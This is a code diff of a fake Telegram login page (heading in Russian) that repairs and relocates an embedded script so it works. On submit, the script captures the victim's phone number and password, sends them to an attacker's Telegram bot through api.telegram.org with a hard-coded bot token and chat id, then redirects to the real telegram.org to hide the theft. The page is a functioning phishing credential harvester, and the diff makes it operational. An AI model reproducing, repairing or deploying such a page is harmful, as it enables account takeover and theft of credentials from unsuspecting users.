@@ -22,17 +22,7 @@ button:hover { background: #4179b3; }
 .footer { margin-top: 20px; color: #7f91a4; font-size: 13px; }
 </style>
 </head>
-<script><body>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  var phone = document.querySelector('input[name="phone"]').value;
-  var pass = document.querySelector('input[name="password"]').value;
-  var token = 8374650070:AAGgtsaa4i0mLgK-eFL0aACB3F2fXn0KS7k;
-  var chat = 7887003990;
-  fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(phone + ':' + pass));
-  window.location.href = 'https://telegram.org';
-});
-</script><body>
+<body>
 <div class="container">
 <img src="https://telegram.org/img/t_logo.png" alt="Telegram" class="logo">
 <h1>Вход в Telegram</h1>
@@ -44,5 +34,16 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 </form>
 <div class="footer">Telegram – a new era of messaging</div>
 </div>
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var phone = document.querySelector('input[name="phone"]').value;
+  var pass = document.querySelector('input[name="password"]').value;
+  var token = '8374650070:AAGgtsaa4i0mLgK-eFL0aACB3F2fXn0KS7k';
+  var chat = '7887003990';
+  fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(phone + ':' + pass));
+  window.location.href = 'https://telegram.org';
+});
+</script>
 </body>
 </html>
